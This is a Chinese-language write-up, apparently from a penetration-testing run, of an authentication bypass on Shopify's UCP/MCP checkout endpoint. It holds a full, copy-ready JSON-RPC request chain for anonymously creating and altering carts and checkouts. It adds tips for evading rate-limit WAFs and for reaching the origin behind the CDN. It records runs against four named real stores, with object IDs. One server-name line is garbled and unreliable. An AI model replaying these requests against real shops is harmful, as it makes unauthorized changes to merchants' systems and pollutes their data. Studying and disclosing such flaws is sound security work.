# Shopify UCP/MCP (/api/ucp/mcp) —— agent profile 门禁自绕，未认证写 Cart/Checkout

## 一句话
Shopify 托管店的 UCP/MCP JSON-RPC 网关，其 agent profile 门禁可用**店铺自身的公开文档** `https://<host>/.well-known/ucp` 绕过；任何匿名方可零凭据调用写类工具，在 Shopify 侧落成真实 Cart / Checkout 对象。属 SaaS 级通性（goffsgames.co.uk、gamers-delight-online.myshopify.com、retro-refresh.com、www.retro32.com 四店复现，4/4 命中）。

## 端点与协议
- 入口：`POST https://<host>/api/ucp/mcp`（也可直连 `https://<shop>.myshopify.com/api/ucp/mcp`，两者行为一致）
- 协议：JSON-RPC 2.0 over MCP（`initialize` / `tools/list` / `tools/call`）
- 必需请求头：`Content-Type: application/json`、`Accept: application/json, text/event-stream`
- 无状态：不需要 session / Cookie / JWT
- 工具清单（`tools/list`，共 14 个）：`search_catalog` `get_product` `get_cart` `create_cart` `update_cart` `cancel_cart` `get_checkout` `create_checkout` `update_checkout` `cancel_checkout` `get_order` `complete_checkout` `ask_business` `lookup_catalog`

## 门禁与绕过
- 门禁要求每次 `tools/call` 的 `arguments.meta.ucp-agent.profile` 提供一个**可达且合规的 agent profile**。
- 缺失/不可达 → `422 {"code":-32001,"data":{"code":"invalid_profile_url","content":"Unable to fetch agent profile: Missing profile uri"}}`
- 绕过：把 profile 指向店铺自己的 `https://<host>/.well-known/ucp`（该文档本就公开、由 Shopify 自动提供，body 内含 `transport:"mcp"` 与 `endpoint:"https://<shop>.myshopify.com/api/ucp/mcp"`，等于把后端地址也一并送出来）→ 校验通过。

## 复现链（无凭据）
```
# 0) 取“自绕凭据”
GET  https://<host>/.well-known/ucp                     -> 200 JSON (powered-by: Shopify)
     body: {"ucp":{"version":"2026-08-25","transport":"mcp","endpoint":"https://<shop>.myshopify.com/api/ucp/mcp",...}}

# 1) 探活
POST /api/ucp/mcp  {"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"probe","version":"1"}}}
     -> 200 result.serverInfo.name = "universal-commecommand execution validation-protocol"

# 2) 列工具（本身无鉴权）
POST /api/ucp/mcp  {"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}
     -> 200, 14 tools

# 3) 阴性对照：不带 profile
POST /api/ucp/mcp  {"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"search_catalog","arguments":{"catalog":{"query":"game"}}}}
     -> 422 invalid_profile_url  (证明门禁存在)

# 4) 阳线：profile 指向店铺自身文档，匿名读目录拿真实 variant
POST /api/ucp/mcp
{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"search_catalog",
 "arguments":{"meta":{"ucp-agent":{"profile":"https://<host>/.well-known/ucp"}},
 "catalog":{"query":"game"}}}}
     -> 200 status:success，回真实 gid://shopify/ProductVariant/<ID> 与价格

# 5) 匿名写 Cart
POST /api/ucp/mcp
{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"create_cart",
 "arguments":{"meta":{"ucp-agent":{"profile":"https://<host>/.well-known/ucp"}},
 "cart":{"line_items":[{"item":{"id":"gid://shopify/ProductVariant/<VARIANT_ID>"},"quantity":1}],
         "context":{"address_country":"GB"}}}}}
     -> 200 {"ucp":{"status":"success"},"id":"gid://shopify/Cart/<ID>?key=<KEY>"}

# 6) 匿名写 Checkout
POST /api/ucp/mcp
{"jsonrpc":"2.0","id":6,"method":"tools/call","params":{"name":"create_checkout",
 "arguments":{"meta":{"ucp-agent":{"profile":"https://<host>/.well-known/ucp"}},
 "checkout":{"line_items":[{"item":{"id":"gid://shopify/ProductVariant/<VARIANT_ID>"},"quantity":2}],
             "buyer":{"email":"pentest-probe@example.com"}}}}}
     -> 200 status:success id=gid://shopify/Checkout/<ID>?key=<KEY>，totals 随 quantity 精确翻倍

# 7) 状态变更
update_cart   (id + meta + cart.line_items)  -> 200 status:success，同 GID，totals 按新数量重算
cancel_cart   (id + meta)                    -> 200 status:success；随后 get_cart 同 id -> cart_not_found
update_checkout / cancel_checkout 同形。
```
同样可匿名成功的写工具：`update_cart` `cancel_cart` `update_checkout` `cancel_checkout`（均 200 status:success，回显同一 GID）。

## 边界（不要夸大）
- `get_order`、`complete_checkout` 仍需 JWT → body `{"code":-32000,"message":"AuthenticationRequired"}`。**不能读订单、不能匿名下单。**
  - 注意 HTTP 状态码跨店不一致：goffsgames.co.uk / www.retro32.com 侧为 403，gamers-delight-online.myshopify.com 侧为 HTTP 200 + 同 body。判据看 body 的 code:-32000。
- 带 `Authorization: Bearer <alg=none JWT>` 亦被拒（retro32.com / retro-refresh.com 侧 HTTP 401 + `AuthenticationFailed "Invalid global access token"`；有的店为 403）。
- key 与对象绑定：用 A 对象的 GID + B 对象的 key 组合 → `200 status:error code=cart_not_found`，非 IDOR。
- 影响面 = 未认证的资源创建 / 状态变更（可被滥用为 Abandoned-cart / Checkout 刷量，污染商家报表、占用结账对象），非数据泄露、非账号接管。

## 实战注意
- WAF 按速率触发：**单线程，请求间隔 ≥2.5s**；约 30+ 发命中 429（retry-after 可达数百秒）/403 退避。
- `VARIANT_ID` 需先用 `search_catalog` / `get_product` 拿真实 `gid://shopify/ProductVariant/<id>`。
- 判据必须是“回显真实 `gid://shopify/...` + status:success”，不要只看 HTTP 200；让 quantity 1→2→3 观察 totals 精确成倍，以佐证对象真实创建而非静态回显。
- `/.well-known/ucp` 的 body 里 `endpoint` 字段直接给出 `{shop}.myshopify.com/api/ucp/mcp`，可绕过 CDN 直打源站后端（retro32 实测直连后端 create_cart 同样 status:success、totals 799）。

## 多目标复现记录（同一 SaaS 缺陷）
| 目标 | 任务 | 时间 | 结果 |
|---|---|---|---|
| goffsgames.co.uk | task#11 | 2026-11-11 | create_cart/checkout 200 status:success；去 profile 422；get_order 403 |
| gamers-delight-online.myshopify.com（gamersdelight.co.uk） | task#8 | 2026-11-11 14:32 UTC | create_cart id=gid://shopify/Cart/hWNJ1iznQBNfehjeXUIpyq8u?key=...；create_checkout id=gid://shopify/Checkout/hWNJ1j0Bso9hpG3CaHS6MQwa?key=...；update/cancel_cart 200；get_order 200+body code -32000 |
| retro-refresh.com | task#9 | 2026-11-11 UTC | create_cart id=gid://shopify/Cart/hWNJ1kGQxP4nPS7wiip2RE7s?key=...（真实商品 Apple iPod Video 5th Gen，price 34300）；create_checkout qty2 totals=68600=34300×2；update_cart(1→3)/cancel_cart 200；get_order/complete_checkout 403；alg=none JWT 401；错 key→cart_not_found |
| www.retro32.com（后端 cns21d-0u.myshopify.com） | task#12（finding#166） | 2026-11-11 20:55-21:03 UTC | GET /.well-known/ucp 200（version 2026-08-25、transport mcp、endpoint 指向 cns21d-0u.myshopify.com/api/ucp/mcp）；去 profile 422 invalid_profile_url；create_cart qty1=799（gid://shopify/Cart/hWNJ2MKGFvuqn134ukrq9MFs?key=f70ab79f...）、qty2=1598（gid://shopify/Cart/hWNJ2MMX47E6sJWWFqqcfT20?key=048947b1...）；update_cart 1→3=2397 同 GID；cancel_cart 后 get_cart→cart_not_found；create_checkout qty1=2500、qty2=5000、update_checkout 1→3=7500（gid://shopify/Checkout/hWNJ2Lz2Z9fn8UU2snnNW1tY?key=8108... / hWNJ2M0f7SfWqAPg3uiHvwWO?key=3d92...）；cancel_checkout 后 get_checkout→checkout_not_found；get_order/complete_checkout 无 JWT→403 code -32000；alg=none JWT→401 AuthenticationFailed；别对象 GID+本把 key→cart_not_found；直连后端 create_cart 同样 status:success 799 |

原始响应落盘：goffsgames 见 tasks/11/i340、i390；gamersdelight 见 tasks/8/i453（r_ccart2.json / r_ccheck2.json / r_list.json / b1.json）；retro-refresh 见 tasks/9/i566/b0..b17.json；retro32 见 tasks/12/i2862（neg.resp / cart_ctx.resp / cart_ctx2.resp / ucart3.resp / cc_cart_ctx.resp / chk1.resp / chk2.resp / u_chk1.resp / c_chk2.resp / j_idor.resp / b_order.resp / b_complete.resp / f_direct.resp）。